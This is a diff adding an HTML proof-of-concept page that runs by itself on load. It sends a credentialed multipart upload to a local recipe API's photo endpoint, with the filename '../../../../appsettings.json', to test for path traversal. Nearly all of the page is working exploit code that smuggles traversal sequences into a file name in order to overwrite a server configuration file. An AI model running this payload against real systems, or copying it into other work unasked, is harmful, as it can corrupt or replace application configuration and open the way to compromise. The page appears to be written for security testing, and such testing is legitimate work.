@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Path Traversal via File Upload</title>
+    <style>
+        body { font-family: Arial; padding: 50px; }
+        .result { background: #f0f0f0; padding: 20px; border-radius: 8px;
+                  margin-top: 20px; font-family: monospace; }
+        .code { background: #2d2d2d; color: #f8f8f8; padding: 15px; 
+                border-radius: 5px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h1>Path Traversal Attack via File Upload</h1>
+    <p>Attempting to upload file with malicious path traversal in filename...</p>
+    <p><strong>Target:</strong> <code>POST /api/recipes/19/photo</code></p>
+    <p><strong>Malicious Filename:</strong> <code>../../../../appsettings.json</code></p>
+    
+    <div id="result" class="result">Waiting for response...</div>
+    
+    <script>
+        // Create form data with malicious filename
+        var formData = new FormData();
+        
+        // Create a minimal PNG file (1x1 transparent pixel)
+        // This is actual PNG binary data in base64
+        var pngData = atob('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==');
+        var bytes = new Uint8Array(pngData.length);
+        for (var i = 0; i < pngData.length; i++) {
+            bytes[i] = pngData.charCodeAt(i);
+        }
+        var blob = new Blob([bytes], { type: 'image/png' });
+        
+        // The vulnerability: filename contains path traversal sequences
+        formData.append('photoFile', blob, '../../../../appsettings.json');
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost:4200/api/recipes/19/photo", true);
+        xhr.withCredentials = true; // Include cookies
+        
+        xhr.onload = function() {
+            document.getElementById("result").innerHTML =                 
+                "<h3>Request Completed</h3>" +
+                "<p><strong>Status:</strong> " + xhr.status + "</p>" +
+                "<p><strong>Response:</strong></p><pre class='code'>" + 
+                escapeHtml(xhr.responseText) + "</pre>";                
+        };
+        
+        xhr.onerror = function() {
+            document.getElementById("result").innerHTML = 
+                "<h3>Request Error</h3>" +
+                "<p>The request may have been blocked by CORS or the server may have processed it.</p>" +
+                "<p><strong>Check server logs to verify if:</strong></p>" +
+                "<ul>" +
+                "<li>File was saved outside intended directory</li>" +
+                "<li>Path traversal was sanitized</li>" +
+                "<li>Request was processed successfully</li>" +
+                "</ul>";
+        };
+        
+        xhr.send(formData);
+        
+        function escapeHtml(text) {
+            var div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+    </script>
+</body>
+</html>
